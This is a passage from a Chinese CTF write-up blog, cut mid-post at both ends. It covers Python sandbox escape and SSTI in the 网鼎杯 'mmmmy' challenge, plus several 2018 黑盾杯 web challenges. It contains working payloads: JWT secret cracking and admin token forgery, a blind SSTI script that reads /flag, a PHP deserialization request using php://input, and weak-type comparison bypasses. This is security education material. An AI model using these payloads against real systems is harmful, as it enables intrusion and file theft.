class="string">r'&gt;, &lt;type '</span>MultibyteStreamWrite<span class="string">r'&gt;]</span></span><br><span class="line"><span class="string">&gt;&gt;&gt; ().__class__.__base__.__subclasses__()[40]</span></span><br><span class="line"><span class="string">&lt;type '</span>file<span class="string">'&gt;</span></span><br><span class="line"><span class="string">&gt;&gt;&gt;</span></span><br></pre></td></tr></table></figure><p>我们可以发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">().__class__.__base__.__subclasses__()[40]</span><br></pre></td></tr></table></figure><p>返回的是file类型，我们在后面传入文件名，就相当于读取文件</p><p>这就是python沙箱逃逸的原理</p><p>具体可以参考<a href="https://www.aliyun.com/jiaocheng/437857.html" target="_blank" rel="noopener">https://www.aliyun.com/jiaocheng/437857.html</a></p><h3 id="网鼎杯第三场：mmmmy"><a href="#网鼎杯第三场：mmmmy" class="headerlink" title="网鼎杯第三场：mmmmy"></a>网鼎杯第三场：mmmmy</h3><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/3.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>题目是一个登陆页面，随手试一下用户名test，密码test，成功登录，点击留言，提示只有admin用户才能留言，猜测必须用admin用户登陆，抓包观察</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/5.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/6.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>发现登陆时同时设置了cookie的token字段，而在此访问时，服务器根据token字段识别test用户，观察token值，是经过JWT加密后的值，首先使用 <a href="https://github.com/brendan-rius/c-jwt-cracker" target="_blank" rel="noopener"><strong>c-jwt-cracker</strong></a> 爆破 secret key，结果为</p><p>6a423，然后到<a href="https://jwt.io/进行加密" target="_blank" rel="noopener">https://jwt.io/进行加密</a></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/7.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>加密后的token值替换原本test的token值伪造admin用户登陆</p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/8.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>然后这里的留言post的text存在SSTI漏洞，但是这里过滤了双花括号的写法，我们可以换成流程控制结构的写法 执行语句 ，测试如下： </p><p><img src="/img/Python沙箱逃逸/9.png" alt=""></p><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/Python沙箱逃逸/10.png" alt="" title="">                </div>                <div class="image-caption"></div>            </figure><p>后面的数据就要依靠盲注出来了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;%  <span class="keyword">if</span> ().__class__.__base__.__subclasses__()[<span class="number">40</span>](<span class="string">'/flag'</span>).read()[<span class="number">0</span>]==<span class="string">'f'</span> %&#125;<span class="number">1</span>&#123;%  <span class="keyword">else</span>  %&#125;<span class="number">0</span>&#123;%  endif  %&#125;</span><br></pre></td></tr></table></figure><p>但是这里还过滤了一些关键字，例如’_’，所以我们可以将这些关键属性class,base等放入别的参数，从而绕过对text参数过滤</p><p>使用payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">text=&#123;% <span class="keyword">if</span> request.values.e[<span class="number">18</span>] == ()[request.values.a][request.values.b][request.values.c]()[<span class="number">40</span>](request.values.d).read()[<span class="number">0</span>] %&#125;good&#123;% endif %&#125;&amp;a=__class__&amp;b=__base__&amp;c=__subclasses__&amp;d=/flag&amp;e=&#125;-&#123;<span class="number">0123456789</span>abcdefghijklmnopqrstuvwxyz</span><br></pre></td></tr></table></figure><p>脚本如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://0fe97b99c09c4a1cbf5eb0610879c4e93f084e23d438487d.game.ichunqiu.com/bbs"</span></span><br><span class="line">all_string = <span class="string">"&#125;-&#123;0123456789abcdefghijklmnopqrstuvwxyz"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">"token"</span> : <span class="string">"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.IXEkNe82X4vypUsNeRFbhbXU4KE4winxIhrPiWpOP30"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100</span>):</span><br><span class="line">    f = <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">39</span>):</span><br><span class="line">        print(<span class="string">'checking '</span>+all_string[j])</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'text'</span>:<span class="string">"&#123;%% if request.values.e[%d] == ()[request.values.a][request.values.b][request.values.c]()[40](request.values.d).read()[%d] %%&#125;good&#123;%% endif %%&#125;"</span>%(j,i),</span><br><span class="line">            <span class="string">'a'</span>:<span class="string">'__class__'</span>,</span><br><span class="line">            <span class="string">'b'</span>:<span class="string">'__base__'</span>,</span><br><span class="line">            <span class="string">'c'</span>:<span class="string">'__subclasses__'</span>,</span><br><span class="line">            <span class="string">'d'</span>:<span class="string">'/flag'</span>,</span><br><span class="line">            <span class="string">'e'</span>:all_string</span><br><span class="line">            &#125;</span><br><span class="line">        r = requests.post(url=url,data=data,cookies=cookie)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'good'</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = flag + all_string[j]</span><br><span class="line">            print(<span class="string">'the '</span>+str(i)+<span class="string">' place of flag is: '</span>+all_string[j])</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">elif</span>  <span class="string">'good'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text <span class="keyword">and</span> j == <span class="number">38</span>:</span><br><span class="line">            f = <span class="number">0</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> f == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">            </span><br><span class="line">print(<span class="string">'flag: '</span> + flag)</span><br><span class="line"><span class="comment">#flag: flag&#123;49ec4dfd-6600-4651-a5ff-9c190562991f&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      ctf
    
    </summary>
    
      <category term="ctf" scheme="https://Foxgrin.github.io/categories/ctf/"/>
    
    
      <category term="ctf" scheme="https://Foxgrin.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2018黑盾杯Web</title>
    <link href="https://Foxgrin.github.io//posts/15234/"/>
    <id>https://Foxgrin.github.io//posts/15234/</id>
    <published>2018-09-16T06:34:00.000Z</published>
    <updated>2018-09-17T12:25:28.187Z</updated>
    
    <content type="html"><![CDATA[<p>2018黑盾杯Web题解<a id="more"></a></p><h3 id="无论你输入什么都是错的"><a href="#无论你输入什么都是错的" class="headerlink" title="无论你输入什么都是错的"></a>无论你输入什么都是错的</h3><p>bp抓包获得源代码发现</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;form id=&quot;form1&quot; name=&quot;form1&quot; method=&quot;get&quot; action=&quot;da.html&quot;&gt;</span><br></pre></td></tr></table></figure><p>访问da.html</p><p>源代码中发现flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- flag&#123;250872eab74e4ae2d11ff2b5b3fcb1a5&#125;!--&gt;</span><br></pre></td></tr></table></figure><h3 id="听说很漂亮"><a href="#听说很漂亮" class="headerlink" title="听说很漂亮"></a>听说很漂亮</h3><p>bp抓包发现js代码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type=<span class="string">"text/javascript"</span>&gt;</span><br><span class="line">    <span class="built_in">document</span>.oncontextmenu=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">return</span> <span class="literal">false</span>&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> a,b,c,d,e,f,g;</span><br><span class="line">    a = <span class="number">6.10</span>;</span><br><span class="line">    b = a * <span class="number">2</span>;</span><br><span class="line">    c = a + b;</span><br><span class="line">    d = c / b + a;</span><br><span class="line">    e = c - d * b + a;</span><br><span class="line">    f = e + d /c -b * a;</span><br><span class="line">    g = f * e - d + c * b + a;</span><br><span class="line">    a = g * g;</span><br><span class="line">    a = <span class="built_in">Math</span>.floor(a);</span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">document</span>.getElementById(<span class="string">"txt"</span>).value==a)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            alert(<span class="string">"密码错误"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure><p>需要GET参数txt值等于a的值</p><p>在本地运行测试a的值为98910652</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /web/beautiful/ HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.3.1/student/exam-second/seize-flag</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 12</span><br><span class="line"></span><br><span class="line">txt=98910652</span><br></pre></td></tr></table></figure><p>获得flag:flag{4b5aabaa648c42c53d39935e7ff663b9}</p><h3 id="信息泄露加代码审计"><a href="#信息泄露加代码审计" class="headerlink" title="信息泄露加代码审计"></a>信息泄露加代码审计</h3><p>访问/.svn存在泄露文件获得源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">$user = $_COOKIE[<span class="string">'user'</span>];</span><br><span class="line">$code = $_GET[<span class="string">'code'</span>]?(int)$_GET[<span class="string">'code'</span>]:<span class="string">''</span>;</span><br><span class="line"><span class="keyword">if</span>($user == <span class="string">'admin'</span> &amp;&amp; !<span class="keyword">empty</span>($code)) &#123;</span><br><span class="line"></span><br><span class="line">$hex = (int)$code;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(($hex ^ <span class="number">6789</span>) === <span class="number">0xCDEF</span>) &#123;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"flag.php"</span>);</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line"><span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"缺少应有的参数,你没有权限查看本内容"</span>;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>获得flag条件是$user=admin，$code ^ 6789 = 0xCDEF</p><p>写个脚本爆破code</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1000000</span>):</span><br><span class="line">    <span class="keyword">if</span> i ^ <span class="number">6789</span> == <span class="number">0xCDEF</span>:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运行结果：55146</p><p>payload:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /web/codeaudit/?code=55146 HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line">Referer: http://192.168.3.1/student/exam-second/seize-flag</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=i8h2rmbg3p18n5mt0ppar8a4d5;user=admin</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure><p>flag:﻿﻿flag{a737c5c5b759c3705c8100accf65b5e4}</p><h3 id="the-user-is-admin"><a href="#the-user-is-admin" class="headerlink" title="the user is admin"></a>the user is admin</h3><p>bugku原题，先通过PHP伪协议读取源代码，然后发现要利⽤反序列化漏洞读取flag⽂件。  </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"># index.php</span><br><span class="line">&lt;?php</span><br><span class="line">$user = $_GET[&quot;user&quot;];</span><br><span class="line">$file = $_GET[&quot;file&quot;];</span><br><span class="line">$pass = $_GET[&quot;pass&quot;];</span><br><span class="line">if(isset($user)&amp;&amp;(file_get_contents($user,&apos;r&apos;)===&quot;the user is admin&quot;))&#123;</span><br><span class="line">POST这个数据包就能看到flag</span><br><span class="line">joomla</span><br><span class="line">echo &quot;hello admin!&lt;br&gt;&quot;;</span><br><span class="line">if(preg_match(&quot;/f1a9/&quot;,$file))&#123;</span><br><span class="line">exit();</span><br><span class="line">&#125;else&#123;</span><br><span class="line">include($file); //class.php</span><br><span class="line">$pass = unserialize($pass);</span><br><span class="line">echo $pass;</span><br><span class="line">&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">echo &quot;you are not admin ! &quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># class.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line"><span class="keyword">public</span> $file;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本地测试获得序列化字符串：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Read</span></span>&#123;<span class="comment">//f1a9.php</span></span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">            <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;file);    </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"__toString was called!"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$p = <span class="keyword">new</span> Read();</span><br><span class="line">$p-&gt;file = <span class="string">'f1a9.php'</span>;</span><br><span class="line"><span class="keyword">echo</span> serialize($p);</span><br><span class="line"><span class="comment">#$p == "O:4:"Read":1:&#123;s:4:"file";s:8:"f1a9.php";&#125;"</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST该数据包就能获得flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /web/theuserisadmin/index.php?file=class.php&amp;pass=O:4:&quot;Read&quot;:1:</span><br><span class="line">&#123;s:4:&quot;file&quot;;s:8:&quot;f1a9.php&quot;;&#125;&amp;user=php://input HTTP/1.1</span><br><span class="line">Host: 192.168.200.200</span><br><span class="line">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 17</span><br><span class="line">the user is admin</span><br></pre></td></tr></table></figure><p>flag{078d8dd8023d5716a11780adf344dfd2}</p><h3 id="最好的语言"><a href="#最好的语言" class="headerlink" title="最好的语言"></a>最好的语言</h3><p>源码审计题⽬，考察PHP弱类型⽐较： </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">$a=<span class="number">0</span>;</span><br><span class="line">$b=<span class="number">0</span>;</span><br><span class="line">$c=<span class="number">0</span>;</span><br><span class="line">$d=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'x1'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$x1 = $_GET[<span class="string">'x1'</span>];</span><br><span class="line">$x1==<span class="string">"1"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">switch</span> ($x1)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line"><span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">$a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123;</span><br><span class="line">is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</span><br><span class="line">($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</span><br><span class="line">$p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</span><br><span class="line">$p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">$val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$x3 = $_GET[<span class="string">'x3'</span>];</span><br><span class="line"><span class="keyword">if</span> ($x3 != <span class="string">'15562'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (strstr($x3, <span class="string">'XIPU'</span>)) &#123;</span><br><span class="line"><span class="keyword">if</span> (substr(md5($x3),<span class="number">8</span>,<span class="number">16</span>) == substr(md5(<span class="string">'15562'</span>),<span class="number">8</span>,<span class="number">16</span>)) &#123;</span><br><span class="line">$d=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($a &amp;&amp; $b &amp;&amp; $c &amp;&amp; $d)&#123;</span><br><span class="line"><span class="keyword">include</span> <span class="string">"flag.php"</span>;</span><br><span class="line"><span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>先来看第一个条件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&apos;x1&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">$x1 = $_GET[&apos;x1&apos;];</span><br><span class="line">$x1==&quot;1&quot;?die(&quot;ha?&quot;):NULL;</span><br><span class="line">switch ($x1)</span><br><span class="line">&#123;</span><br><span class="line">case 0:</span><br><span class="line">case 1:</span><br><span class="line">$a=1;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>考察弱类型比较，switch函数处理字符串时也会对字符串进行intval处理</p><p>payload:x1=1a</p><p>第二个条件：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$x2=(<span class="keyword">array</span>)json_decode(@$_GET[<span class="string">'x2'</span>]);</span><br><span class="line"><span class="keyword">if</span>(is_array($x2))&#123;</span><br><span class="line">is_numeric(@$x2[<span class="string">"x21"</span>])?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">if</span>(@$x2[<span class="string">"x21"</span>])&#123;</span><br><span class="line">($x2[<span class="string">"x21"</span>]&gt;<span class="number">2017</span>)?$b=<span class="number">1</span>:<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(is_array(@$x2[<span class="string">"x22"</span>]))&#123;</span><br><span class="line"><span class="keyword">if</span>(count($x2[<span class="string">"x22"</span>])!==<span class="number">2</span> <span class="keyword">OR</span> !is_array($x2[<span class="string">"x22"</span>][<span class="number">0</span>])) <span class="keyword">die</span>(<span class="string">"ha?"</span>);</span><br><span class="line">$p = array_search(<span class="string">"XIPU"</span>, $x2[<span class="string">"x22"</span>]);</span><br><span class="line">$p===<span class="keyword">false</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line"><span class="keyword">foreach</span>($x2[<span class="string">"x22"</span>] <span class="keyword">as</span> $key=&gt;$val)&#123;</span><br><span class="line">$val===<span class="string">"XIPU"</span>?<span class="keyword">die</span>(<span class="string">"ha?"</span>):<span class="keyword">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="number">1</span>;</span><br><span 